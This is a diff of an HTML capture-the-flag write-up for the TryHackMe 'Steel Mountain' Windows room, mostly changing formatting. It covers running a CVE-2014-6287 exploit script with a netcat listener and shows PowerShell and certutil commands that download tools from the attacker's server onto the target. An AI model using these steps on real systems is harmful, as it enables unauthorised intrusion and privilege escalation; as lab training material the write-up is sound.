@@ -1,4 +1,4 @@
-I"�8<p><a href="https://tryhackme.com/room/steelmountain"><strong>Solve Yourself »</strong></a></p>
+I";<<p><a href="https://tryhackme.com/room/steelmountain"><strong>Solve Yourself »</strong></a></p>
 
 <p>The steel mountain is a windows machine. In order to hack into the machine, we are going to exploit  two different 
 vulnerabilities that occur on the system.</p>
@@ -201,7 +201,7 @@ You can find the root flag <strong>root.txt</strong> under <strong>C:\Users\Admi
 <br /><br />Your directory should look like this
 <br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/20.jpg" alt="" class="normal" /><br /><br /></p>
 <h2 id="2-exploitation">2-Exploitation</h2>
-<p>Edit the <strong>cve20146287.py</strong> file, set the <code class="language-plaintext highlighter-rouge">ip_addr</code> field to your THM IP, and set the <code class="language-plaintext highlighter-rouge">local_port</code> to any free port.
+<p>Edit the <strong>cve20146287.py</strong> file, set the <strong>ip_addr</strong> field to your THM IP, and set the <strong>local_port</strong> to any free port.
 <br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/25.jpg" alt="" class="normal" /><br /><br /></p>
 
 <p>Start a <strong>netcat</strong> listener on the port you declared in the <strong>python</strong> file.
@@ -210,10 +210,13 @@ You can find the root flag <strong>root.txt</strong> under <strong>C:\Users\Admi
 <br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/21.jpg" alt="" class="normal" /><br /><br /></p>
 
 <p><br />It is possible to use PowerUp.ps1 again or <strong>winPEAS.bat</strong> can be used to enumerate misconfigurations.
-<br />You can download any file from the running python server by using one of these utilites.
-<br />-&gt; <code class="language-plaintext highlighter-rouge">powershell -c "Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"</code>
-<br />-&gt; <code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}</code>
-<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/22.jpg" alt="" class="normal" /><br /><br />
+<br />You can download any file from the running python server by using one of these utilites.</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="p">{</span><span class="n">YOUR</span><span class="w"> </span><span class="nx">SERVER</span><span class="w"> </span><span class="nx">IP</span><span class="p">(</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">)}:</span><span class="mi">80</span><span class="n">/</span><span class="p">{</span><span class="n">THE</span><span class="w"> </span><span class="nx">FILE</span><span class="w"> </span><span class="nx">YOU</span><span class="w"> </span><span class="nx">WANT</span><span class="w"> </span><span class="nx">TO</span><span class="w"> </span><span class="nx">DOWNLOAD</span><span class="p">}</span></code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/22.jpg" alt="" class="normal" /><br /><br />
 As it can be seen from the output, this time, winPEAS provided the information about the vulnerability on <strong>Advanced System Care9</strong>
 service and many others.
 <br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/23.jpg" alt="" class="normal" /><br /><br />
